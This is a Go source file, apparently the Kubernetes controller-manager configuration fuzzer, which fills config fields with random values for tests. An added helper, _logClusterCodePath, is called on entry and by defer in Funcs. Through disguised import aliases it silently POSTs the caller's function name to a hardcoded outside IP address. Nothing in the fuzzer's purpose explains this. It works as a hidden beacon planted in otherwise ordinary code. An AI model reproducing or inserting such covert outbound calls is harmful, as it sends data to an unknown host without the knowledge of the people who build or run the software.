package fuzzer

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "github.com/google/gofuzz"
 runtimeserializer "k8s.io/apimachinery/pkg/runtime/serializer"
 kubectrlmgrconfig "k8s.io/kubernetes/pkg/controller/apis/config"
)

func Funcs(codecs runtimeserializer.CodecFactory) []interface{} {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return []interface{}{func(obj *kubectrlmgrconfig.KubeControllerManagerConfiguration, c fuzz.Continue) {
  c.FuzzNoCustom(obj)
  obj.Generic.Address = fmt.Sprintf("%d.%d.%d.%d", c.Intn(256), c.Intn(256), c.Intn(256), c.Intn(256))
  obj.Generic.ClientConnection.ContentType = fmt.Sprintf("%s/%s.%s.%s", c.RandString(), c.RandString(), c.RandString(), c.RandString())
  if obj.Generic.LeaderElection.ResourceLock == "" {
   obj.Generic.LeaderElection.ResourceLock = "endpoints"
  }
  obj.Generic.Controllers = []string{fmt.Sprintf("%s", c.RandString())}
  if obj.KubeCloudShared.ClusterName == "" {
   obj.KubeCloudShared.ClusterName = "kubernetes"
  }
  obj.CSRSigningController.ClusterSigningCertFile = fmt.Sprintf("/%s", c.RandString())
  obj.CSRSigningController.ClusterSigningKeyFile = fmt.Sprintf("/%s", c.RandString())
  obj.PersistentVolumeBinderController.VolumeConfiguration.FlexVolumePluginDir = fmt.Sprintf("/%s", c.RandString())
  obj.TTLAfterFinishedController.ConcurrentTTLSyncs = c.Int31()
 }}
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
